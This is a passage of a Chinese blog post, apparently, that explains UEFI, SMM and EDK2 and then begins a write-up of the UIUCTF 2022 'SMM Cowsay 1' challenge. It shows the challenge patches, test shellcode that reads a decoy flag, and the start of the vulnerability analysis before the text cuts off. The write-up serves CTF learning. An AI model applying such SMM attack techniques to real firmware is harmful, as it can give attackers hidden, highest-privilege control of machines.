    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>UEFI即Unified Extensible Firmware Interface(<strong>统一可扩展固件接口</strong>)是一种个人电脑系统规格，用来定义操作系统与系统固件之间的软件界面,作为BIOS的替代方案</p><p>更多可见wiki<a href="https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2">https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E5%8F%AF%E5%BB%B6%E4%BC%B8%E9%9F%8C%E9%AB%94%E4%BB%8B%E9%9D%A2</a></p><h2 id="UEFI组成"><a href="#UEFI组成" class="headerlink" title="UEFI组成"></a>UEFI组成</h2><p>一般认为，UEFI由以下几个部分组成：</p><ol><li>Pre-EFI初始化模块（PEI）</li><li>UEFI驱动程序执行环境（DXE）</li><li>UEFI驱动程序（UEFI driver）</li><li>兼容性支持模块（CSM）</li><li>UEFI高层应用（UEFI Application）</li><li>GUID磁盘分区表</li><li>系统管理模式（SMM）</li></ol><p>Pre-EFI初始化程序在系统开机的时候最先得到执行，它负责最初的CPU，芯片组及主存的初始化工作，<strong>紧接着加载UEFI的驱动程序执行环境（DXE）</strong>。</p><p>当DXE被加载运行时，系统便具有了枚举并加载其他UEFI驱动程序的能力。DXE枚举并加载各种总线（包括PCI、SATA、USB、ISA）及硬件的UEFI驱动程序。例如一个具PCI-E总线接口的RAID存储适配器，其UEFI驱动程序一般会放置在这个设备的Option ROM中。在UEFI规范中，一种突破传统MBR磁盘分区结构限制的GUID磁盘分区系统（GPT）被引入，新结构中，磁盘的主分区数不再受限制（在MBR结构下，只能存在4个主分区），另外UEFI+GPT结合还可以支持2.1 TB以上硬盘。</p><p>在众多的分区类型中，EFI系统分区可以被UEFI固件访问，可用于存放操作系统的引导程序。UEFI固件通过执行EFI系统分区中的启动程序启动操作系统]。</p><p>CSM是在x86平台UEFI系统中的一个特殊的模块，它将为不具备UEFI引导能力的操作系统以及16位的传统Option ROM提供类似于传统BIOS的系统服务。</p><p>在加载操作系统后，UEFI的SMM程序继续执行，提供ACPI等服务</p><h2 id="SMM"><a href="#SMM" class="headerlink" title="SMM"></a>SMM</h2><blockquote><p>系统管理模式（System Management mode）（以下简称SMM）是Intel在80386SL之后引入x86体系结构的一种CPU的执行模式。系统管理模式只能通过系统管理中断（System Management Interrupt, SMI）进入，并只能通过执行RSM指令退出。SMM模式对操作系统透明，换句话说，操作系统根本不知道系统何时进入SMM模式，也无法感知SMM模式曾经执行过。为了实现SMM，Intel在其CPU上新增了一个引脚SMI# Pin，当这个引脚上为高电平的时候，CPU会进入该模式。在SMM模式下一切被都屏蔽，包括所有的中断。SMM模式下的执行的程序被称作SMM处理程序，所有的SMM处理程序只能在称作系统管理内存（System Management RAM,SMRAM）的空间内运行。可以通过设置SMBASE的寄存器来设置SMRAM的空间。SMM处理程序只能由系统固件（如BIOS或UEFI）实现。</p><p><a href="https://en.wikipedia.org/wiki/System_Management_Mode">System Management Mode</a> is documented in <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a>, Volume 3C, Chapter 30. It is the operating mode with highest privilege, and sometimes referred to as “ring -2”. This mode has higher privilege than an OS/kernel (ring 0) and even an hypervisor (ring -1). It can only be entered through a System Management Interrupt (SMI), it has a separate address space completely invisible to other operating modes, and full access to all physical memory, MSRs, control registers etc.</p></blockquote><p>SMM有时被称作 <code>ring -2</code>,因为其具有最高级别权限<strong>,唯一进入该模式的方式只有SMI</strong>(系统管理中断)</p><p>处理器执行<em>SMM</em>代码的时候是在一个单独的地址空间（<em>SMRAM</em>）下完成的，并且这段地址空间在其他模式下是绝对不能被访问的</p><p>SMI 可以由软件使用 IO 端口 <code>0xB2</code> 触发(<u>outb dx, al</u>)，并且此功能可用于实现 SMM 和非 SMM 代码之间的某种受控通信机制。并通过<code>RSM</code>指令退出SMM</p><h2 id="UEFI与操作系统的关系"><a href="#UEFI与操作系统的关系" class="headerlink" title="UEFI与操作系统的关系"></a>UEFI与操作系统的关系</h2><p>UEFI在概念上类似于一个低阶的操作系统，并且具有操控所有硬件资源的能力。不少人感觉它的不断发展将有可能代替现代的操作系统。事实上，EFI的缔造者们在第一版规范出台时就将EFI的能力限制于不足以威胁操作系统的统治地位。</p><p>首先，它只是硬件和预启动软件间的接口规范；其次，UEFI环境下<strong>不提供中断的机制</strong>，也就是说每个UEFI驱动程序必须用<strong>轮询</strong>（polling）的方式来检查硬件状态，并且需要以<strong>解释</strong>的方式运行，较操作系统下的机械码驱动效率更低；再则，UEFI系统不提供复杂的缓存器保护功能，它只具备简单的缓存器管理机制，具体来说就是指运行在x64或x86处理器的长模式或保护模式下，以最大寻址能力为限把缓存器分为一个平坦的段（Segment），所有的程序都有权限访问任何一段位置，并不提供真实的保护服务。</p><p>当UEFI所有组件加载完毕时，便会启动操作系统的启动程序，如果UEFI固件内置UEFI Shell，也可以启动UEFI Shell命令提示。<u>UEFI应用程序（UEFI Application）和UEFI驱动程序（UEFI driver）是PE格式的.efi文件，可用C语言编写。</u>在UEFI引导模式下，操作系统的启动程序也是UEFI应用程序，启动程序的EFI文件存储在EFI系统分区（ESP）上。</p><p>UEFI固件区分架构，在UEFI引导模式下，通常只能执行特定架构的UEFI操作系统和特定架构的EFI应用程序（EBC程序除外）。比如，采用64位UEFI固件的PC，在UEFI引导模式下只能执行64位操作系统启动程序；而在Legacy引导模式（即BIOS兼容引导模式）下，既可以执行16位的操作系统（如DOS），也可以执行32位操作系统和64位操作系统。</p><h2 id="EDK2"><a href="#EDK2" class="headerlink" title="EDK2"></a>EDK2</h2><p><a href="https://github.com/tianocore/edk2/tree/master">tianocore/edk2: EDK II</a></p><p>EDK2（EFI Development Kit II）是一个开源的项目，它提供了一个用于开发 UEFI（统一扩展固件接口）固件的全面工具和框架。</p><p>也是事实上的UEFI的实现</p><p>我们做的题目都是是基于EDK2,大多数时候给的是OVMF.fd</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="uictf2022-cowsay1"><a href="#uictf2022-cowsay1" class="headerlink" title="uictf2022-cowsay1"></a>uictf2022-cowsay1</h2><p>参考<a href="https://ctftime.org/writeup/34881">CTFtime.org / UIUCTF 2022 / SMM Cowsay 1 / Writeup</a></p><p><strong>learn interface</strong></p><h3 id="摸索"><a href="#摸索" class="headerlink" title="摸索"></a>摸索</h3><p>我们收到的文件包含：</p><ul><li>构建的挑战二进制文件以及 <code>qemu-system-x86_64</code> 二进制文件和启动脚本提供了在本地运行挑战所需的参数。</li><li>挑战赛的源代码是 EDK2（事实上的标准 UEFI 实现）和 QEMU 的一系列补丁，以及用于应用它们并构建所有内容的 <code>Dockerfile</code> 。</li><li>为远程运行的挑战而完成的构建的 EDK2 构建工件（即带有有用调试符号的二进制文件）。</li></ul><p>运行挑战时，我们会收到以下消息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">UEFI Interactive Shell v2.2</span><br><span class="line">EDK II</span><br><span class="line">UEFI v2.70 (EDK II, 0x00010000)</span><br><span class="line">Shell&gt; binexec</span><br><span class="line"> ____________________________________________________________________</span><br><span class="line">/ Welcome to binexec!                                                \</span><br><span class="line">| Type some shellcode <span class="keyword">in</span> hex and I<span class="string">&#x27;ll run it!                        |</span></span><br><span class="line"><span class="string">|                                                                    |</span></span><br><span class="line"><span class="string">| Type the word &#x27;</span><span class="keyword">done</span><span class="string">&#x27; on a seperate line and press enter to execute |</span></span><br><span class="line"><span class="string">\ Type &#x27;</span><span class="built_in">exit</span><span class="string">&#x27; on a seperate line and press enter to quit the program /</span></span><br><span class="line"><span class="string"> --------------------------------------------------------------------</span></span><br><span class="line"><span class="string">                    \   ^__^</span></span><br><span class="line"><span class="string">                     \  (oo)\_______</span></span><br><span class="line"><span class="string">                        (__)\       )\/\</span></span><br><span class="line"><span class="string">                            ||----w |</span></span><br><span class="line"><span class="string">                            ||     ||</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Address of SystemTable: 0x00000000069EE018</span></span><br><span class="line"><span class="string">Address where I&#x27;</span>m gonna run your code: 0x000000000517D100</span><br></pre></td></tr></table></figure><p>其启动了一个<a href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,事实上大多数uefi的题目使用的都是该开源软件,然后在其上进行一些patch</p><h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>EDK2 补丁 <code>0003-SmmCowsay-Vulnerable-Cowsay.patch</code> 实现了一个名为 <code>SmmCowsay.efi</code> 的 UEFI SMM 驱动程序：该驱动程序将在 SMM 中运行，并注册一个要执行的处理程序（通过 <code>SmiHandlerRegister</code> 函数）在 SMM 中，打印文本的方式与owsay Linux 命令非常相似：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure><p><strong>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</strong></p><p>下一个补丁 <code>0004-Add-UEFI-Binexec.patch</code> 实现了一个名为 <code>Binexec.efi</code> 的普通UEFI驱动程序，它将与我们交互（通过控制台输入/输出）并与 <code>SmmCowsay.efi</code> 驱动程序交互以打印我们在运行挑战时看到上面的问候横幅。</p><p>为了与 <code>SmmCowsay.efi</code> 驱动程序进行通信， <code>Binexec.efi</code> 通过 <code>EFI_SMM_COMMUNICATION_PROTOCOL</code> 结构体提供的 <code>-&gt;Communicate()</code> 方法发送一条“消息”：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mSmmCommunication-&gt;Communicate(</span><br><span class="line">    mSmmCommunication, <span class="comment">// &quot;THIS&quot; pointer</span></span><br><span class="line">    Buffer,            <span class="comment">// Pointer to message of type EFI_SMM_COMMUNICATE_HEADER</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>该函数将消息复制到全局变量中并触发软件 SMI 来处理它。该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</p><p><code>Binexec.efi</code> 驱动程序将简单地在循环中运行，要求我们提供一些十六进制形式的代码，将其复制到 RWX 内存区域，然后跳转到其中（使用程序集包装器保存/恢复寄存器）。这意味着我们能够在 UEFI 驱动程序内运行任意代码，该驱动程序以超级用户模式（也称为 Ring 0）运行。</p><p>QEMU 补丁实现了一个自定义 MMIO 设备，该设备只需读取主机上的 <code>region4</code> 文件，并创建一个从物理地址 <code>0x44440000</code> 开始、大小为 <code>0x1000</code> 的 MMIO 内存区域。保存该文件的内容。这意味着访问地址 <code>0x44440000</code> 处的物理内存将调用 QEMU 设备读/写操作 ( <code>MemoryRegionOps</code> )，这将决定如何处理内存读/写。</p><p>读取操作处理程序 ( <code>uiuctfmmio_region4_read_with_attrs()</code> ) 执行检查，确保读取在传递给函数的 <code>MemTxAttrs</code> 结构中设置了 <code>.secure</code> 标志，这意味着读取由SMM发出。如果不是这种情况，则会返回一个假标志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> MemTxResult <span class="title function_">uiuctfmmio_region4_read_with_attrs</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> *val, <span class="type">unsigned</span> size, MemTxAttrs attrs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!attrs.secure)</span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, nice_try_msg, nice_try_len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        uiuctfmmio_do_read(addr, val, size, region4_msg, region4_len);</span><br><span class="line">    <span class="keyword">return</span> MEMTX_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EFI-System-Table"><a href="#EFI-System-Table" class="headerlink" title="EFI System Table"></a>EFI System Table</h3><p>打印给我们的信息,还让我们获得了 <code>SystemTable</code> 的地址以及 shellcode 将复制（和运行）的地址。在 UEFI 规范上花费的时间可能超出了所需的时间，它包含了我们了解其含义所需的所有信息。</p><p><code>SystemTable</code> 是 EFI 系统表，它是一个包含在 UEFI 驱动程序中执行任何操作所需的所有信息的结构。它保存了一堆指向其他结构的指针，这些结构实际上保存了另一堆指向 API 方法、配置变量等的指针。</p><blockquote><p>UEFI uses the EFI System Table, which contains pointers to the runtime and boot services tables. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the service tables are pointers to functions as defined in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> and <a href="https://uefi.org/specs/UEFI/2.10/08_Services_Runtime_Services.html#services-runtime-services">Services — Runtime Services</a> . Prior to a call to <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a> , all of the fields of the EFI System Table are valid. After an operating system has taken control of the platform with a call to <em>ExitBootServices()</em> , only the <em>Hdr</em> , <em>FirmwareVendor</em> , <em>FirmwareRevision</em> , <em>RuntimeServices</em> , <em>NumberOfTableEntries</em> , and <em>ConfigurationTable</em> fields are valid.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER                 Hdr;</span><br><span class="line">  CHAR16                           *FirmwareVendor;</span><br><span class="line">  UINT32                           FirmwareRevision;</span><br><span class="line">  EFI_HANDLE                       ConsoleInHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_INPUT_PROTOCOL   *ConIn;</span><br><span class="line">  EFI_HANDLE                       ConsoleOutHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *ConOut;</span><br><span class="line">  EFI_HANDLE                       StandardErrorHandle;</span><br><span class="line">  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL  *StdErr;</span><br><span class="line">  EFI_RUNTIME_SERVICES             *RuntimeServices;</span><br><span class="line">  EFI_BOOT_SERVICES                *BootServices;</span><br><span class="line">  UINTN                            NumberOfTableEntries;</span><br><span class="line">  EFI_CONFIGURATION_TABLE          *ConfigurationTable;</span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure><p>我们现在感兴趣的是 EFI 系统表的 <code>BootServices</code> 字段，它保存指向 EFI 引导服务表的指针（参阅<a href="https://uefi.org/specs/UEFI/2.10/04_EFI_System_Table.html#efi-boot-services-table">EFI System Table — UEFI Specification documentation</a>）：另一个表保存一堆针对不同 UEFI API 的有用函数指针。</p><blockquote><p>UEFI uses the EFI Boot Services Table, which contains a table header and pointers to all of the boot services. The definition for this table is shown in the following code fragments. Except for the table header, all elements in the EFI Boot Services Tables are prototypes of function pointers to functions as defined in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#services-boot-services">Services — Boot Services</a> . The function pointers in this table are not valid after the operating system has taken control of the platform with a call to <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-exitbootservices">EFI_BOOT_SERVICES.ExitBootServices()</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_SIGNATURE 0x56524553544f4f42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_BOOT_SERVICES_REVISION EFI_SPECIFICATION_VERSION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_TABLE_HEADER     Hdr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Task Priority Services</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  EFI_RAISE_TPL        RaiseTPL;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">  EFI_RESTORE_TPL      RestoreTPL;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Memory Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_ALLOCATE_PAGES   AllocatePages;  <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_PAGES       FreePages;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_GET_MEMORY_MAP   GetMemoryMap;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_ALLOCATE_POOL    AllocatePool;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_FREE_POOL        FreePool;       <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Event &amp; Timer Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CREATE_EVENT     CreateEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_TIMER        SetTimer;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_WAIT_FOR_EVENT   WaitForEvent;   <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SIGNAL_EVENT     SignalEvent;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CLOSE_EVENT      CloseEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_CHECK_EVENT      CheckEvent;     <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Protocol Handler Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_INSTALL_PROTOCOL_INTERFACE     InstallProtocolInterface;            <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REINSTALL_PROTOCOL_INTERFACE   ReinstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_UNINSTALL_PROTOCOL_INTERFACE   UninstallProtocolInterface;          <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_HANDLE_PROTOCOL                HandleProtocol;                      <span class="comment">// EFI 1.0+</span></span><br><span class="line"> VOID*   Reserved;    <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_REGISTER_PROTOCOL_NOTIFY       RegisterProtocolNotify;              <span class="comment">// EFI  1.0+</span></span><br><span class="line">    EFI_LOCATE_HANDLE                  LocateHandle;                        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_LOCATE_DEVICE_PATH             LocateDevicePath;                    <span class="comment">// EFI 1.0+</span></span><br><span class="line"> EFI_INSTALL_CONFIGURATION_TABLE       InstallConfigurationTable;           <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Image Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               LoadImage;        <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_START                StartImage;       <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT                       Exit;             <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_IMAGE_UNLOAD               UnloadImage;      <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_EXIT_BOOT_SERVICES         ExitBootServices; <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_GET_NEXT_MONOTONIC_COUNT   GetNextMonotonicCount; <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_STALL                      Stall;                 <span class="comment">// EFI 1.0+</span></span><br><span class="line">    EFI_SET_WATCHDOG_TIMER         SetWatchdogTimer;      <span class="comment">// EFI 1.0+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// DriverSupport Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CONNECT_CONTROLLER         ConnectController;     <span class="comment">// EFI 1.1</span></span><br><span class="line">    EFI_DISCONNECT_CONTROLLER      DisconnectController;  <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Open and Close Protocol Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_OPEN_PROTOCOL              OpenProtocol;           <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CLOSE_PROTOCOL             CloseProtocol;          <span class="comment">// EFI 1.1+</span></span><br><span class="line"> EFI_OPEN_PROTOCOL_INFORMATION     OpenProtocolInformation;<span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Library Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_PROTOCOLS_PER_HANDLE       ProtocolsPerHandle;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_HANDLE_BUFFER       LocateHandleBuffer;     <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_LOCATE_PROTOCOL            LocateProtocol;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES  InstallMultipleProtocolInterfaces;    <span class="comment">// EFI 1.1+</span></span><br><span class="line">  EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces;   <span class="comment">// EFI 1.1+*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 32-bit CRC Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_CALCULATE_CRC32    CalculateCrc32;     <span class="comment">// EFI 1.1+</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Miscellaneous Services</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    EFI_COPY_MEM           CopyMem;        <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_SET_MEM            SetMem;         <span class="comment">// EFI 1.1+</span></span><br><span class="line">    EFI_CREATE_EVENT_EX    CreateEventEx;  <span class="comment">// UEFI 2.0+</span></span><br><span class="line">  &#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>尝试一下执行shellcode</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ pwn asm -c amd64 <span class="string">&#x27;mov rax, qword ptr [0x44440000]; mov rbx, qword ptr [0x44440008]&#x27;</span></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">488b042500004444488b1c2508004444</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">Running...</span><br><span class="line">RAX: 0x6E7B667463756975 RBX: 0x2179727420656369 RCX: 0x0000000000000000</span><br><span class="line">...</span><br><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">$ python3</span><br><span class="line">&gt;&gt;&gt; (0x6E7B667463756975).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;uiuctf&#123;n&#x27;</span></span><br><span class="line">&gt;&gt;&gt; (0x2179727420656369).to_bytes(8, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">b<span class="string">&#x27;ice try!&#x27;</span></span><br></pre></td></tr></table></figure><p>QEMU 补丁按预期工作：MMIO 驱动程序发现我们没有从系统管理模式读取内存，并给了我们假标志。即使我们确实可以访问物理内存，我们仍然无法通过在 <code>Binexec.efi</code> 驱动程序中运行代码来读取该标志。我们需要从系统管理模式中读取它。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>题目给出了打在uefishell上的patch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">+VOID</span><br><span class="line">+Cowsay (</span><br><span class="line">+  IN CONST CHAR16 *Message</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line">+</span><br><span class="line">+  Buffer = AllocateRuntimeZeroPool(<span class="keyword">sizeof</span>(*Buffer) + <span class="keyword">sizeof</span>(CHAR16 *));</span><br><span class="line">+  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+</span><br><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = <span class="keyword">sizeof</span>(CHAR16 *);</span><br><span class="line">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line">+</span><br><span class="line">+  mSmmCommunication-&gt;Communicate(</span><br><span class="line">+    mSmmCommunication,</span><br><span class="line">+    Buffer,</span><br><span class="line">+    <span class="literal">NULL</span></span><br><span class="line">+  );</span><br></pre></td></tr></table></figure><p>如上所述，普通 